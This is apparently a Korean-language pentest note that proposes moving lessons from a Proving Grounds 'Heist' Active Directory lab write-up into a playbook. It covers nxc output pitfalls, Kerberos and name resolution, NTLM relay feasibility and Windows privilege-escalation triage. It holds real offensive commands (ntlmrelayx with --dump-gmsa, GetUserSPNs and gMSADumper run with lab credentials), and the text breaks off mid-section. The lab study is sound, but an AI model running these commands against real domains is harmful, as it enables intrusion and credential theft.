---
tags:
  - type/audit
  - platform/pg
manual_tags: true
manual_cves: true
manual_ports: true
manual_services: true
---
# Heist — `_PLAYBOOK` 이관 제안

소스: `03. PG\Heist.md` 웨이브 17 소급 개작(1352행 → OSCP 제출 보고서 골격).
원본 백업: `03. PG\_backup\Heist.md.bak` (84,377B).

⚠️ **이 파일은 제안이다. `_PLAYBOOK.md` 는 `pg-line-manager` 가 단독으로 반영한다.**
⚠️ 「신규」 제안은 **번호를 비워 두었다.** 반영자가 충돌을 보고 배정하고, 배정 후 `Heist.md` 의 `## 관련` 앵커를 함께 갱신할 것.

제안 14건 — **병합 10 / 신규 4.**

---

## 1. A-11. 자동 도구가 뱉은 값이 의심스럽다 — **병합**

### 넣을 본문

**nxc 의 WinRM `(Pwn3d!)` 는 관리자 판정이 아니다 — 소스가 무조건 참을 반환한다.** [[Heist]] — `WINRM … heist.offsec\enox:california (Pwn3d!)` 가 떴으나 BloodHound 상 `enox` 는 `Administrators` 멤버가 아니었음(`-512`·`-519`·`-500` 셋뿐). Kali nxc 소스가 이유임:

```bash
┌──(kali㉿kali)-[~]
└─$ sed -n '122,134p' /usr/lib/python3/dist-packages/nxc/protocols/winrm.py
    def check_if_admin(self):
        wsman = self.conn.wsman
        wsen = NAMESPACES["wsen"]
        wsmn = NAMESPACES["wsman"]

        enum_msg = ET.Element(f"{{{wsen}}}Enumerate")
        ET.SubElement(enum_msg, f"{{{wsmn}}}OptimizeEnumeration")
        ET.SubElement(enum_msg, f"{{{wsmn}}}MaxElements").text = "32000"

        wsman.enumerate("http://schemas.microsoft.com/wbem/wsman/1/windows/shell", enum_msg)
        self.admin_privs = True
        return True
```
`wsman.enumerate()` 결과를 보지 않고 `admin_privs = True` 를 대입함. **WinRM 줄의 `(Pwn3d!)` = 「WinRM 인증이 됐다」일 뿐임.** 관리자 판정으로 읽으면 「왜 `proof.txt` 가 안 읽히지」에 시간을 태움.
→ **실제 판정 근거는 같은 스윕의 SMB 줄임** — `ADMIN$`·`C$` 에 권한 표시가 없으면 로컬 관리자가 아님. **SMB 줄의 `(Pwn3d!)` 는 `ADMIN$` 접근 성공을 실제로 확인하므로 신뢰할 수 있음.**

### 지우기 전 원문 (Heist §2-6 콜아웃)

> > [!danger] nxc의 WinRM `(Pwn3d!)`는 **관리자라는 뜻이 아니다** — 소스로 확인했다
> > §3-4의 스윕에서 `WINRM ... heist.offsec\enox:california (Pwn3d!)` 가 나온다. 그런데 BloodHound상 `enox`는 `Administrators`의 멤버가 아니다:
> > ```bash
> > ┌──(kali㉿kali)-[~/PG/Heist]
> > └─$ jq -r '.data[] | select(.Properties.name=="ADMINISTRATORS@HEIST.OFFSEC") | .Members[].ObjectIdentifier' 20260708141821_groups.json
> > S-1-5-21-537427935-490066102-1511301751-512     # Domain Admins
> > S-1-5-21-537427935-490066102-1511301751-519     # Enterprise Admins
> > S-1-5-21-537427935-490066102-1511301751-500     # Administrator
> > ```
> > 모순처럼 보이지만 아니다. Kali의 nxc 소스를 열어보면 이유가 명확하다: (소스 블록 — 위와 동일)
> > **`admin_privs = True`를 무조건 대입하고 반환한다.** `wsman.enumerate()`의 결과를 보지 않는다.
> > 결론: **WinRM 줄의 `(Pwn3d!)`는 "WinRM 인증이 됐다 = 셸을 얻을 수 있다"는 뜻일 뿐**이다. 관리자 판정으로 읽으면 그 다음 30분을 "왜 `proof.txt`가 안 읽히지"에 태운다.
> > **SMB 줄의 `(Pwn3d!)`는 다르다** — 그쪽은 `ADMIN$` 접근 성공을 실제로 확인한다.

⚠️ 원문의 jq 블록에는 `# Domain Admins` 류 **손으로 붙인 주석**이 있었다. 실제 출력에는 없다(재실행 확인). 위 제안본과 노트에는 **주석 없는 실제 출력**을 실었다.
⚠️ 이 항목은 `enox` 가 관리자가 아니라는 판정이 `Initial Access` 재현에 직접 필요해 **노트에도 콜아웃으로 남겼다.** 중복이 아니라 노트 쪽이 근거, 플레이북 쪽이 일반화다.

---

## 2. A-23. 워드리스트에 없는 파일명은 브루트포싱으로 못 찾는다 — **병합**

### 넣을 본문

**입력창이 하나뿐인 단일 파라미터 앱에 디렉터리 브루트는 그 자체가 오판이다.** [[Heist]] — 8080 "Super Secure Web Browser" 는 화면에 `Enter URL` 입력창 하나뿐이고 그것이 `?url=` 로 반영됐음. 그런데 「숨은 관리자 페이지가 있을 것」이라 가정하고 `directory-list-lowercase-2.3-medium` + `-x html,txt` 를 걸어 **148,104 / 622,887 요청(24%)** 을 돌림. 결과는 **루트 `/` 하나(200, 3608B)** 뿐(`ferox-…state`).
→ **화면의 파라미터가 URL 에 그대로 반영되면 공격면은 이미 눈앞에 다 있음.** 62만 요청짜리 워드리스트를 걸기 전에 그 파라미터를 먼저 만질 것.
→ **손절선** — 워드리스트 10%(약 6만 요청)를 돌고도 200 이 루트 하나뿐이면 거기서 끊을 것. 백그라운드로 돌려두는 것은 괜찮으나 그것을 기다리며 다른 일을 멈추면 안 됨. 실제로 [[Heist]] 는 스캔이 도는 동안 `?url=` 을 손으로 만지다 Responder 에 해시가 들어와 **브루트포싱이 끝나기 전에 박스가 풀렸음**(A-18 과 같은 배치).

### 지우기 전 원문 (Heist §1-3 · §6-1)

> 단일 파라미터 앱에 디렉터리 브루트포싱은 헛수고다
> 화면에 입력창이 하나 있고 그것이 `?url=`로 반영된다면 **공격면은 이미 눈앞에 다 있다.** 62만 요청짜리 워드리스트를 돌리기 전에 그 파라미터를 먼저 만져라.
> 같은 교훈이 [[Exghost]]에도 있다 — 30만 건 완주 0건. 워드리스트에 없는 이름은 브루트포싱으로 안 나온다.

> ### 6-1. feroxbuster 148,104 요청 → 0건 (가장 큰 시간 낭비)
> `.state` 파일이 증거다(§1-3). 62만 요청 중 24%를 돌고 중단했다.
> **무엇을 잘못 봤나** — 입력창이 하나뿐인 단일 파라미터 앱을 보고도 "숨은 관리자 페이지가 있을 것"이라고 가정했다.
> **어떻게 알아챘나** — 스캔이 도는 동안 `?url=`을 손으로 만져보다가 Responder에 해시가 들어왔다. 브루트포싱이 끝나기 전에 박스가 풀렸다.
> **손절선** — 워드리스트 10%(약 6만 요청)를 돌고도 200이 루트 하나뿐이면 **거기서 끊는다.** 백그라운드로 돌려두는 것은 괜찮지만 그것을 기다리며 다른 일을 멈추면 안 된다.

⚠️ 노트에는 `.state` 파싱 블록과 「148,104개 요청을 던져 얻은 것은 루트 `/` 하나」 실측만 `Service Enumeration` 에 남겼다(열거 결과이므로). 교훈은 전량 이관이다.

---

## 3. A-51. AD 박스에서 막히면 «취약점»이 아니라 넷을 먼저 본다 — **병합**

### 넣을 본문 (항목 1 「시계」와 항목 2 「이름 해석」에 각각 붙임)

**항목 2(이름 해석)에 붙일 것 — `-ns` 는 Kerberos 를 구제하지 않는다.**
`bloodhound-python -ns <DC-IP>` 는 **LDAP 조회에 쓰는 리졸버**만 바꾼다. **Kerberos 단계는 시스템 리졸버로 `dc.<도메인>:88` 을 찾는다.** [[Vault]] 에서 관측된 원문:
```text
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication.
         Error: [Errno Connection error (dc.vault.offsec:88)] [Errno -2] Name or service not known
```
NTLM 이 살아 있으면 폴백해 수집이 되지만, **NTLM 비활성 도메인이면 여기서 수집 자체가 실패한다.** 그때 필요한 것이 `/etc/hosts` 이고 **세 이름을 다 넣는다** — 도구마다 요구 형태가 다르다(impacket 계열은 FQDN, `evil-winrm -r` 은 realm, 일부는 짧은 호스트명):
```text
192.168.120.165  DC01.heist.offsec  heist.offsec  DC01
```
SPN 은 `서비스클래스/호스트FQDN` 형태라 Kerberos 는 IP 로 티켓을 요청할 수 없다. `-k` 인증·`impacket-getST`·`evil-winrm -r` 전부 이 등록이 없으면 죽는다.

**항목 1(시계)에 붙일 것 — 시계를 만지기 «전에» 용의자에서 배제하라.**
`nmap -sCV -A` 가 이미 세 축으로 답을 준다 — `ssl-date` 의 `Ns from scanner time`, `smb2-time` 의 `date:`, 88 포트 배너의 `server time:`. [[Heist]] 는 셋 다 일치했고(`0s from scanner time`) Kerberos 를 한 번도 쓰지 않았다. **차이가 5분 이내면 시계는 용의자가 아니다** — 이 확인 없이 시계부터 만지면 진짜 원인(FQDN 미등록·SPN 오타·NTLM 폴백)을 놓친다.
⚠️ **`ntpdate` 도 `faketime` 도 현행 Kali 에 없다**(2026-08-26 실측 — `ntpdate` 는 `apt-cache policy` 상 **Candidate 조차 없음**, `faketime` 미설치). 쓸 수 있는 것은 `sudo rdate -n <DC-IP>` 뿐이다.

### 지우기 전 원문 (Heist §2-8 · §4-1)

> **전제조건 1 — 이름 해석.** Kerberos는 IP로 티켓을 요청할 수 없다. SPN이 `서비스클래스/호스트FQDN` 형식이기 때문이다(`cifs/DC01.heist.offsec`, `HTTP/DC01.heist.offsec`). 그래서 `/etc/hosts`에 등록이 필요하다:
> ```text
> 192.168.120.165  DC01.heist.offsec  heist.offsec  DC01
> ```
> **세 이름을 다 넣는 이유**: 도구마다 요구하는 형태가 다르다. `impacket-getST`는 FQDN을, `evil-winrm -r`은 realm을, 일부 도구는 짧은 호스트명을 쓴다. 하나만 넣고 다른 도구에서 막히면 원인을 못 찾는다.
>
> **전제조건 2 — 시계.** Kerberos는 리플레이 방지를 위해 인증자(authenticator)에 현재 시각을 넣고, KDC/서비스가 자기 시계와 비교한다. 기본 허용 오차는 **5분**이고, 넘으면 이 오류가 난다:
> - `KRB_AP_ERR_SKEW` (Clock skew too great)
> - impacket 계열은 파이썬 예외로 `Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`
>
> 이 박스에서는 문제가 없었다. nmap이 그것을 스캔 시점에 이미 확인해 줬다:
> ```text
> 3389/tcp  open  ms-wbt-server Microsoft Terminal Services
> |_ssl-date: 2026-07-08T04:58:17+00:00; 0s from scanner time.
> ```
> **`0s from scanner time`** — Kali 시계와 DC 시계의 차이가 0초다. `smb2-time`의 `date: 2026-07-08T04:57:39`, 88 포트 배너의 `server time: 2026-07-08 04:56:41Z`도 같은 값을 가리킨다. **독립 근거 세 개가 일치한다.**
>
> `KRB_AP_ERR_SKEW`를 만나면 — 두 가지 대처
> **A. 시스템 시계를 타겟에 맞춘다** (전역, 되돌려야 함)
> ```bash
> sudo ntpdate <DC-IP>            # 또는 sudo rdate -n <DC-IP>
> sudo timedatectl set-ntp false  # 자동 동기가 다시 밀어버리는 것을 막는다
> ```
> [[Resourced]]에서 실제로 `sudo ntpdate 192.168.120.175`를 친 기록이 있다.
>
> **B. 그 명령에만 가짜 시각을 준다** (전역 시계를 안 건드린다)
> ```bash
> faketime "$(date -d "$(nxc smb <DC-IP> | grep -oP '(?<=time: ).*')" '+%Y-%m-%d %H:%M:%S')" impacket-getST ...
> ```
> **B가 낫다** — VPN·인증서 검증·다른 박스 작업이 시계에 물려 있어서, 전역 시계를 밀면 엉뚱한 곳이 깨진다. 위 `faketime` 한 줄은 이 박스에서 실행하지 않았다 — 관측된 것이 아니라 대처 절차의 형태를 적어둔 것이다.
>
> **판정 순서: nmap의 `ssl-date`/`smb2-time` → 차이가 5분 이내면 시계는 용의자가 아니다.** 이 확인 없이 시계부터 만지면 진짜 원인(FQDN 미등록·SPN 오타·NTLM 폴백)을 놓친다.

> > [!danger] `-ns`를 줘도 **Kerberos는 별도로 실패한다** — `/etc/hosts`가 필요한 이유
> > [[Vault]]에서 같은 명령의 출력이 이것을 그대로 보여줬다(관측된 원문):
> > ```
> > INFO: Getting TGT for user
> > WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication.
> >          Error: [Errno Connection error (dc.vault.offsec:88)] [Errno -2] Name or service not known
> > ```
> > `-ns`는 **LDAP 조회에 쓰는 리졸버**를 바꾸지만, **Kerberos 단계는 시스템 리졸버로 `dc.<도메인>:88`을 찾는다.** 그래서 NTLM으로 폴백했다.
> > NTLM이 막힌 환경(NTLM 비활성 도메인)이라면 여기서 수집 자체가 실패한다. **그때 필요한 것이 `/etc/hosts`다:**
> > ```
> > 192.168.120.165  DC01.heist.offsec  heist.offsec  DC01
> > ```
> > **SPN은 `서비스클래스/호스트FQDN` 형태**라 Kerberos는 IP가 아니라 이름으로만 티켓을 요청할 수 있다. `-k` 인증·`impacket-getST`·`evil-winrm -r` 전부 이 등록이 없으면 죽는다.
> > 같은 함정이 [[Resourced]]·[[Nagoya]]의 티켓 위조 구간에서도 나온다.

> NTLM과 Kerberos를 언제 갈아타는가 — 결정표
>
> | 상황 | 쓸 것 |
> |---|---|
> | 평문 비밀번호가 있고 SMB/WinRM만 필요 | NTLM (`-u/-p`). 이 박스가 여기 |
> | NT 해시만 있고 SMB/WinRM 필요 | NTLM PtH (`-H`). 이 박스 §4-3 |
> | NT 해시만 있는데 Kerberos 전용 서비스 | Overpass-the-Hash — `impacket-getTGT -hashes :<NT>` → `export KRB5CCNAME=...` → `-k` |
> | 도메인이 NTLM 차단 | Kerberos 필수. `/etc/hosts` + 시계 확인부터 |
> | 위임·티켓 위조(Golden/Silver) | Kerberos 필수 ([[Nagoya]]·[[Resourced]]) |

⚠️ **위 결정표도 A-51 에 함께 붙일 것.** 「이 박스가 여기」 류 표현은 [[Heist]] 로 바꿔 쓸 것.

---

## 4. A-4-11. 권한상승 페이로드에 «다른 박스»의 사용자명·`>` 덮어쓰기가 섞여 들어온다 — **병합**

### 넣을 본문

**같은 잔류가 «AD 열거 명령»에도 남는다 — 도메인·IP·TLD.** [[Heist]] 한 세션에서만 세 종류가 났음:

| 잔류 | 실제 | 어디서 왔나 |
|---|---|---|
| `impacket-GetUserSPNs nagoya-industries.com/enox:california` | `heist.offsec` | 바로 앞에 푼 [[Nagoya]] 의 도메인. 히스토리를 위로 올려 재사용하며 도메인만 안 고침 |
| `gMSADumper.py … -d heist.local` | `heist.offsec` | 「AD 랩은 `.local`」이라는 습관. nmap 이 `Domain: heist.offsec`·`DNS_Tree_Name: heist.offsec` 으로 **두 번** 말해줬는데도 |
| `nxc-sweep 192.168.120.172 -u 'enox' -p 'california'` | 192.168.120.165 | 같은 세션에 병행하던 [[Vault]] 의 IP |

→ **도메인 이름은 추측하지 말고 `nmap.log` 에서 복사해 붙일 것.** PG/OffSec 랩은 `.offsec`·`.com`·`.local` 이 뒤섞여 있음.
→ **방어책: 박스마다 디렉터리를 새로 만들고(`mkdir Heist; cd Heist`) 첫 명령으로 `nnmap` 을 칠 것.** 그러면 `nmap.log` 가 그 디렉터리의 정답 IP·도메인이 되고 히스토리 재사용 시 대조할 기준이 생김.
→ ⚠️ **다만 「자격증명을 옆 호스트에 던지는 반사」 자체는 옳다.** 시험 AD 세트는 같은 도메인의 여러 호스트로 구성되고 거기서는 그 스윕이 피벗의 전부임. 판단 기준은 하나 — **같은 도메인인가.** nmap 의 `DNS_Domain_Name` 을 비교하면 3초에 앎.

### 지우기 전 원문 (Heist §6-2 · §6-3 · §6-7)

> ### 6-2. Kerberoasting 시도 — 두 번 실패
> ```bash
> ┌──(kali㉿kali)-[~/PG/Heist]
> └─$ impacket-GetUserSPNs nagoya-industries.com/enox:california -dc-ip 192.168.120.165
> ┌──(kali㉿kali)-[~/PG/Heist]
> └─$ impacket-GetUserSPNs heist.offsec/enox:california -dc-ip 192.168.120.165
> ```
> **첫 줄은 도메인이 통째로 틀렸다** — `nagoya-industries.com`은 바로 앞에 풀던 [[Nagoya]]의 도메인이다. 히스토리에서 위로 올려 재사용하다 도메인만 안 고쳤다.
>
> 박스를 연달아 풀 때 가장 흔한 오류가 **앞 박스 값의 잔류**다
> 이 세션에서만 세 종류가 났다 — 도메인(`nagoya-industries.com`), IP(`192.168.120.175` → [[Vault]] §6), 그리고 §6-3의 `.local`/`.offsec`.
> **방어책: 박스마다 디렉터리를 새로 만들고(`mkdir Heist; cd Heist`) 첫 명령으로 `nnmap`을 친다.** 그러면 `nmap.log`가 그 디렉터리의 정답 IP·도메인이 되고, 히스토리 재사용 시 대조할 기준이 생긴다.

> ### 6-3. gMSA 덤프 — 도메인 오타로 실패
> ```bash
> ┌──(kali㉿kali)-[~/PG/Heist]
> └─$ gMSADumper.py -u enox -p california -d heist.local
> ```
> **`heist.local`이 아니라 `heist.offsec`이다.** nmap이 이미 `Domain: heist.offsec`·`DNS_Tree_Name: heist.offsec`으로 두 번 말해줬는데, "AD 랩은 `.local`" 이라는 습관이 이겼다.
> 이 명령의 실제 출력은 기록에 남지 않았다. 도메인이 존재하지 않으므로 LDAP 연결/이름 해석 단계에서 실패한다 — 구체적인 오류 문구는 관측된 것이 아니다.
> **교훈: 도메인 이름은 추측하지 말고 `nmap.log`에서 복사해 붙여라.** PG/OffSec 랩은 `.offsec`·`.com`·`.local`이 뒤섞여 있다.

> ### 6-7. 자격증명을 옆 박스에 던져봤다
> ```bash
> ┌──(kali㉿kali)-[~/PG/Heist]
> └─$ nxc-sweep 192.168.120.172 -u 'enox' -p 'california'
> ```
> `192.168.120.172`는 [[Vault]] 다. `heist.offsec`의 자격증명을 `vault.offsec`에 던진 것이라 성립할 리 없다(두 랩은 서로 다른 독립 도메인이다).
> **그런데 이 반사 자체는 옳다.** 시험 AD 세트는 같은 도메인의 여러 호스트로 구성되고, 거기서는 이 스윕이 피벗의 전부다. 판단 기준은 하나 — **같은 도메인인가.** nmap의 `DNS_Domain_Name`을 비교하면 3초에 알 수 있다.

⚠️ **원문 §6-2 는 IP 잔류를 `192.168.120.175` 로 적었으나 §6-7 의 실제 명령은 `192.168.120.172` 다.** 노트 내부 모순이므로 제안본은 실제 명령 값(`.172`)을 채택했다.

---

## 5. A-64. 사후에 시간 서사를 복원하는 법 — mtime + 스크린샷 파일명 — **병합** (⭐ 1순위)

### 넣을 본문

**⛔ 「히스토리에 없다 = 실행하지 않았다」가 아니다 — zsh 설정이 조용히 지운다.**

[[Heist]] 실측 — `hashcat.potfile` 에는 두 박스의 결과가 모두 들어 있다:
```bash
┌──(kali㉿kali)-[~]
└─$ grep -iE "^ANIRUDH|^ENOX" ~/.local/share/hashcat/hashcat.potfile | rev | cut -d: -f1 | rev
SecureHM
california
```
그런데 `~/.zsh_history` 에는 `hashcat -m 5600 hash.txt …` 가 **한 번만** 나온다. `~/.zshrc` 가 답이다:
```bash
┌──(kali㉿kali)-[~]
└─$ grep -iE "HISTSIZE|SAVEHIST|hist_" ~/.zshrc
HISTSIZE=1000
SAVEHIST=2000
setopt hist_expire_dups_first # delete duplicates first when HISTFILE size exceeds HISTSIZE
setopt hist_ignore_dups       # ignore duplicated commands history list
setopt hist_ignore_space      # ignore commands that start with space
```
두 박스에서 문자열이 동일한 명령을 쳤고 한 벌이 지워진 것으로 본다 `[가정]`.

히스토리가 빠짐없는 기록이 «아닌» 이유 셋:
- `hist_ignore_dups` — 직전과 같은 명령은 안 남음
- `hist_ignore_space` — **공백으로 시작한 명령은 통째로 안 남음**(비밀번호가 든 명령을 이렇게 감춤)
- `hist_expire_dups_first` + `HISTSIZE=1000` — 파일이 커지면 **중복부터** 사라짐

→ **부재를 미실행의 근거로 쓰지 말 것.** 결과물(potfile·`.state`·`nmap.log`·스크린샷)과 교차해야 확정된다. 이것은 A-64 의 「기록 신뢰 순서」를 **부재 판정 쪽으로** 확장한 것이고, `CLAUDE.md` §3 의 「부재 증거의 등급 상한은 `근거부족`」과 같은 선이다.

### 지우기 전 원문 (Heist §6-8)

> ### 6-8. Vault의 hashcat 명령이 히스토리에 없다 — 히스토리를 근거로 쓸 때의 함정
> `hashcat.potfile`에는 두 박스의 결과가 모두 들어 있다: (potfile grep 블록)
> 그런데 `~/.zsh_history`에는 `hashcat -m 5600 hash.txt ...`가 한 번만 나온다. `~/.zshrc`가 답이다: (zshrc grep 블록)
> **중복 명령이 우선적으로 만료된다.** 두 박스에서 문자열이 동일한 명령을 쳤고 한 벌이 지워진 것으로 본다 `[가정]`.
>
> 히스토리는 **빠짐없는 기록이 아니다**
> - `hist_ignore_dups` — 직전과 같은 명령은 안 남는다
> - `hist_ignore_space` — **공백으로 시작한 명령은 통째로 안 남는다** (비밀번호가 들어간 명령을 이렇게 감춘다)
> - `hist_expire_dups_first` + `HISTSIZE=1000` — 파일이 커지면 중복부터 사라진다
>
> **그래서 "히스토리에 없다 = 실행하지 않았다"가 아니다.** 결과물(potfile·`.state`·`nmap.log`)과 교차해야 확정된다. 이 노트의 서술은 그 원칙으로 썼다.

---

## 6. A-5. Active Directory — **신규**

**제목 제안:** `강제 인증 해시는 잡았는데 릴레이가 안 통한다 — 릴레이 가능 여부는 3초에 판정한다`
(번호는 반영자가 배정. A-53 다음 자리)

### 넣을 본문

**증상** — Responder/PetitPotam 등으로 NetNTLMv2 를 잡았는데 `ntlmrelayx` 가 아무것도 못 함.

**판정 순서 — 이 셋 중 하나라도 걸리면 릴레이는 죽고 오프라인 크랙만 남는다.**
1. `nmap` 의 `smb2-security-mode` 가 `Message signing enabled and required` 인가 → **SMB 릴레이 죽음.** DC 는 기본이 필수임
2. `nxc smb <대역> --gen-relay-list targets.txt` 로 서명이 꺼진 호스트를 뽑는다 (⚠️ [[Heist]] 에서는 **실행하지 않았음 — 관측 없음**)
3. **넘길 「다른 호스트」가 있는가** — MS16-075 이후 동일 호스트로의 NTLM 릴레이는 커널이 거부한다. 호스트가 한 대뿐인 랩에서는 릴레이할 B 가 애초에 없다

[[Heist]] 실측 — 셋 다 걸렸다. `impacket-ntlmrelayx -t ldaps://192.168.120.165 -debug --dump-gmsa --no-dump --no-da --no-acl --no-validate-privs` 를 실제로 던졌음. **발상 자체는 맞았으나**(`--dump-gmsa` = enox 인증을 LDAPS 로 릴레이해 gMSA 비밀번호를 뽑자) 인증이 오는 곳도 DC01, 릴레이 대상도 DC01 이었고 `computers.json` 에 호스트는 `DC01.HEIST.OFFSEC` **하나뿐**이었음. `nmap.log` 의 `Message signing enabled and required` 한 줄을 먼저 읽었으면 이 시도를 통째로 건너뛸 수 있었음.

**LDAP(389)/LDAPS(636) 릴레이도 Server 2019 DC 기본 정책상 봉인·채널 바인딩을 요구한다** — 단 [[Heist]] 에서 **관측된 것은 아니고 일반적 기본값** `[가정]`.

→ **릴레이는 「호스트가 둘 이상」일 때의 도구다.** 단일 호스트 랩에서는 크랙이나 ACL 이 답이다. 반대로 시험 AD 세트(보통 DC 1 + 멤버 2)에서는 릴레이가 훨씬 강력해진다 — **크랙 불가능한 컴퓨터 계정 인증도 릴레이는 그대로 쓴다.**
→ 그리고 나가는 값이 **`NTProofStr`**(챌린지에 NT 해시를 키로 건 HMAC-MD5)이라는 것이 이 갈림의 근본 이유다. 평문도 NT 해시도 아니라 그대로 재사용할 수 없고, **릴레이(중계) 아니면 오프라인 크랙(재계산)** 둘 중 하나뿐이다.

### 지우기 전 원문 (Heist §2-1 표 · §2-4 · §6-4)

> 여기서 나가는 것은 **비밀번호도, NT 해시도 아니다.** 나가는 것은 `NTProofStr` — 서버가 준 챌린지에 NT 해시를 키로 HMAC-MD5를 건 결과다. 그래서 이 값은 그대로 재사용할 수 없고, 두 가지 중 하나로만 쓸 수 있다:
>
> | 쓰는 법 | 조건 | 이 박스에서 |
> |---|---|---|
> | 릴레이 — 받은 챌린지·리스폰스를 다른 서버에 그대로 중계 | 대상 프로토콜에 서명/채널 바인딩이 없어야 한다 | ❌ SMB 서명 필수 (§2-4) |
> | 오프라인 크랙 — 후보 비밀번호로 NT 해시를 만들어 HMAC을 재계산, `NTProofStr`과 비교 | 비밀번호가 약해야 한다 | ✅ `california` (rockyou 4096번째 후보) |

> ### 2-4. 왜 릴레이가 아니라 크랙이었나 — 판정 근거
> `impacket-ntlmrelayx`를 실제로 시도했다(§6-4). 결론부터: 이 박스에서는 무의미하다.
>
> | 릴레이 대상 | 이 박스의 상태 | 근거 |
> |---|---|---|
> | SMB(445) | 서명 필수 | `nmap.log` → `smb2-security-mode: 3.1.1: Message signing enabled and required` |
> | LDAP(389) / LDAPS(636) | DC 기본 정책상 봉인·채널 바인딩 요구 | 관측된 것이 아니다 — Server 2019 DC의 일반적 기본값이다 `[가정]` |
> | 자기 자신에게 릴레이 | 원천 차단 | MS16-075 이후 동일 호스트로의 NTLM 릴레이는 커널이 거부한다. 이 박스는 호스트가 하나뿐이므로 릴레이할 "다른 서버"가 애초에 없다 |
>
> **세 번째 이유가 결정적이다.** 이 랩은 **DC 한 대짜리 단일 호스트 도메인**이다(BloodHound `computers.json`에 `DC01.HEIST.OFFSEC` 하나뿐). 릴레이는 "A가 나에게 인증한 것을 B에게 넘기는" 공격인데 B가 존재하지 않는다.
>
> 릴레이 가능 여부는 3초 만에 판정한다
> 1. `nmap`의 `smb2-security-mode`가 `enabled and required`인가? → 그러면 SMB 릴레이 죽음
> 2. `nxc smb <대역> --gen-relay-list targets.txt` 로 서명이 꺼진 호스트를 뽑는다 (관측된 것이 아니다 — 이 박스에서는 실행하지 않았다)
> 3. 넘길 호스트가 한 대도 없으면 릴레이는 포기하고 크랙으로 간다
>
> 반대로 시험 AD 세트처럼 **멤버 서버가 여러 대**면 릴레이가 훨씬 강력하다 — 크랙 불가능한 컴퓨터 계정 인증도 릴레이는 그대로 쓴다.

> ### 6-4. NTLM 릴레이 시도 — 애초에 성립하지 않는 판
> ```bash
> ┌──(kali㉿kali)-[~/PG/Heist]
> └─$ impacket-ntlmrelayx -t ldaps://192.168.120.165 -debug --dump-gmsa --no-dump --no-da --no-acl --no-validate-privs
> ```
> `--dump-gmsa`가 있으니 발상 자체는 맞다 — "enox의 인증을 LDAPS로 릴레이해 gMSA 비밀번호를 뽑자".
> **문제는 릴레이할 대상이 이 박스 하나뿐이라는 것**이다(§2-4). 인증이 오는 곳도 DC01, 릴레이 대상도 DC01. MS16-075 이후 동일 호스트로의 NTLM 릴레이는 막혀 있다.
> `nmap.log`의 `Message signing enabled and required` 한 줄을 먼저 읽었으면 이 시도를 건너뛸 수 있었다.
> **교훈: 릴레이는 "호스트가 둘 이상"일 때의 도구다.** 단일 호스트 랩에서는 크랙이나 ACL이 답이다. 시험의 AD 세트(보통 DC 1 + 멤버 2)에서는 반대로 릴레이가 강력해진다.

⚠️ **노트에는 `Message signing enabled and required` 판정 한 문단만 `Service Enumeration` 에 남겼다**(nmap raw 를 읽는 법이므로). 릴레이 시도와 판정 절차는 전량 이관이다.

---

## 7. A-4. 권한상승 — **신규**

**제목 제안:** `Windows 셸을 잡았는데 어느 특권을 써야 할지 모르겠다 — «던지기 전에» 3초·10초 판정으로 후보를 지운다`
(번호는 반영자가 배정)

### 넣을 본문

**증상** — SYSTEM 후보가 여럿인데 하나씩 던져보며 시간을 태움. 실패가 조용해서 더 태움.

[[Heist]] 는 `svc_apache$` 셸을 잡은 직후 후보 셋 중 둘을 **명령을 던지기 전에** 지웠다.

**후보 1 — Potato 계열(PrintSpoofer/GodPotato/SweetPotato). 판정 3초.**
`whoami /priv` 에 `SeImpersonatePrivilege` 가 있는가. Potato 계열은 명명 파이프로 SYSTEM 토큰을 가장한 뒤 그 토큰으로 프로세스를 만드는 공격이라 이 특권이 전제다. 없으면 토큰을 훔쳐도 쓸 수 없다. [[Heist]] 의 특권은 4개(`SeMachineAccount`·`SeRestore`·`SeChangeNotify`·`SeIncreaseWorkingSet`)뿐이라 [[Squid]]·B-46 의 반사가 즉시 죽었다.

**후보 2 — DCSync. 판정 10초.**
`domains.json`(또는 BloodHound GUI 의 도메인 노드 → Inbound Object Control)에 **`GetChanges` + `GetChangesAll` 을 «동시에»** 가진 **비기본** principal 이 있는가. 둘 중 하나만으로는 성립하지 않는다(A-53 과 같은 판정).
```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ jq -r '.data[] | (.Aces//[])[] | select(.RightName|test("GetChanges"))
           | [.RightName,.PrincipalSID,.PrincipalType] | @tsv' 20260708141821_domains.json
GetChanges	S-1-5-21-537427935-490066102-1511301751-498	Group
GetChangesAll	S-1-5-21-537427935-490066102-1511301751-516	Group
GetChangesInFilteredSet	HEIST.OFFSEC-S-1-5-32-544	Group
GetChanges	HEIST.OFFSEC-S-1-5-32-544	Group
GetChangesAll	HEIST.OFFSEC-S-1-5-32-544	Group
GetChangesInFilteredSet	HEIST.OFFSEC-S-1-5-9	Group
GetChanges	HEIST.OFFSEC-S-1-5-9	Group
```
전부 기본 principal 이다 — `-498` Enterprise Read-only Domain Controllers, `-516` Domain Controllers, `S-1-5-32-544` BUILTIN\Administrators, `S-1-5-9` Enterprise Domain Controllers. `svc_apache$`(`-1105`)도 `WEB ADMINS`(`-1104`)도 없다. `impacket-secretsdump` 를 던져봤자 `DRSUAPI` 권한 거부로 끝난다.
→ **이 확인은 10초고, secretsdump 를 돌려 실패를 보는 것은 1~2분 + 오판의 여지다.**

**남은 후보 3 이 `SeRestorePrivilege` 였고 그것이 정답이었다.**
→ 일반화: **특권 이름 하나가 곧 경로다.** Windows 셸을 잡으면 `whoami /priv` 가 첫 명령이고, 그래프(BloodHound)는 시작점이지 전부가 아니다 — **URA·로컬 특권은 BloodHound 수집 대상이 아니다.**

### 지우기 전 원문 (Heist §6-9)

> ### 6-9. `svc_apache$`를 잡고 나서 접은 두 경로
> gMSA 해시로 셸을 얻은 직후, SYSTEM으로 가는 후보가 셋이었다. 둘은 그 자리에서 접었다.
> **후보 1 — Potato 계열(PrintSpoofer/GodPotato).** `whoami /priv`(§4-3)에 **`SeImpersonatePrivilege`가 없다.** Potato 계열은 명명 파이프로 SYSTEM 토큰을 가장한 뒤 그 토큰으로 프로세스를 만드는 공격이라 이 특권이 전제다. 없으면 토큰을 훔쳐도 쓸 수가 없다. [[Squid]]에서 쓴 반사신경이 여기서는 즉시 죽는다. **`whoami /priv` 한 줄로 3초에 판정된다.**
> **후보 2 — DCSync.** 서비스 계정이 복제 권한을 갖고 있는 랩이 흔하다. BloodHound JSON으로 확인했더니 아니었다:
> ```bash
